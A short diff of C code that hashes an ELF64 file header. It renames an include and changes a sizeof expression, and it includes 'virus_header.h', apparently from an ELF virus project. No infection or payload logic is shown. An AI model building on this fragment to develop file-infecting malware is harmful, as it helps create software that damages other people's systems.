@@ -5,7 +5,7 @@
 #include "virus_header.h"
 #include "utils.h"
 #include "errors.h"
-#include "log.h"
+#include "logs.h"
 
 static bool	compute_elf_hdr_hash(uint64_t *hdr_hash,
 			struct safe_ptr file_ref)
@@ -15,7 +15,7 @@ static bool	compute_elf_hdr_hash(uint64_t *hdr_hash,
 	if (elf_hdr == NULL)
 		return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);
 
-	*hdr_hash = hash((uint8_t*)elf_hdr, sizeof(Elf64_Ehdr));
+	*hdr_hash = hash((uint8_t*)elf_hdr, sizeof(*elf_hdr));
 	return true;
 }
 
